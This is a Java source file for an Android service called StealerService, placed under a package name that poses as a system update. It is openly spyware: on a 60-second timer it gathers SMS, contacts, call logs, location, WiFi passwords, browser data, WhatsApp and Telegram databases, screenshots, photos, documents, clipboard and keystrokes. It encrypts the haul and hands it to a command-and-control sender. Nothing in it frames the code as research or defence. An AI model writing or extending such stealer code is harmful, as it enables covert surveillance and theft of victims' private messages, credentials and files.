package com.android.system.update.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import com.android.system.update.utils.ContactsUtils;
import com.android.system.update.utils.CryptoUtils;
import com.android.system.update.utils.FileUtils;
import com.android.system.update.utils.LocationUtils;
import com.android.system.update.utils.SMSUtils;

import org.json.JSONObject;

import java.io.File;
import java.util.Timer;
import java.util.TimerTask;

public class StealerService extends Service {
    
    private Timer stealTimer;
    private static final String TAG = "StealerService";
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startStealing();
        return START_STICKY;
    }
    
    private void startStealing() {
        stealTimer = new Timer();
        stealTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                stealAllData();
            }
        }, 0, 60000); // Every 60 seconds
    }
    
    private void stealAllData() {
        try {
            JSONObject stolenData = new JSONObject();
            
            // 1. SMS
            stolenData.put("sms", SMSUtils.getAllSMS(getApplicationContext()));
            
            // 2. Contacts
            stolenData.put("contacts", ContactsUtils.getAllContacts(getApplicationContext()));
            
            // 3. Call Logs
            stolenData.put("calls", CallLogUtils.getAllCalls(getApplicationContext()));
            
            // 4. Location
            stolenData.put("location", LocationUtils.getLocation(getApplicationContext()));
            
            // 5. Installed Apps
            stolenData.put("apps", AppUtils.getInstalledApps(getApplicationContext()));
            
            // 6. WiFi Passwords (requires root)
            if (RootUtils.isRooted()) {
                stolenData.put("wifi", WifiUtils.getSavedPasswords(getApplicationContext()));
            }
            
            // 7. Browser Data
            stolenData.put("browser", BrowserUtils.getBrowserData(getApplicationContext()));
            
            // 8. WhatsApp Database
            File whatsappDb = new File("/data/data/com.whatsapp/databases/msgstore.db");
            if (whatsappDb.exists()) {
                String encrypted = CryptoUtils.encryptFile(whatsappDb);
                stolenData.put("whatsapp", encrypted);
            }
            
            // 9. Telegram Database
            File telegramDb = new File("/data/data/org.telegram.messenger/files/cache4.db");
            if (telegramDb.exists()) {
                String encrypted = CryptoUtils.encryptFile(telegramDb);
                stolenData.put("telegram", encrypted);
            }
            
            // 10. Screenshot
            String screenshot = ScreenUtils.takeScreenshot(getApplicationContext());
            stolenData.put("screenshot", screenshot);
            
            // 11. Photos (last 10)
            JSONObject photos = FileUtils.getRecentPhotos(getApplicationContext(), 10);
            stolenData.put("photos", photos);
            
            // 12. Documents (PDF, DOC, XLS)
            JSONObject documents = FileUtils.getDocuments(getApplicationContext());
            stolenData.put("documents", documents);
            
            // 13. Clipboard
            stolenData.put("clipboard", ClipboardUtils.getText(getApplicationContext()));
            
            // 14. Keystrokes (if keylogger active)
            String keystrokes = KeyloggerUtils.getRecentKeystrokes();
            stolenData.put("keystrokes", keystrokes);
            
            // Encrypt and send to C2
            String encrypted = CryptoUtils.encryptAES(stolenData.toString());
            sendToC2(encrypted);
            
            // Save locally as backup
            FileUtils.saveToFile(new File(getFilesDir(), "stolen_data.json"), encrypted);
            
            Log.d(TAG, "Data stolen successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Steal error", e);
        }
    }
    
    private void sendToC2(String data) {
        // Send via WebSocket
        Intent intent = new Intent("C2_SEND_DATA");
        intent.putExtra("data", data);
        sendBroadcast(intent);
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (stealTimer != null) {
            stealTimer.cancel();
        }
    }
}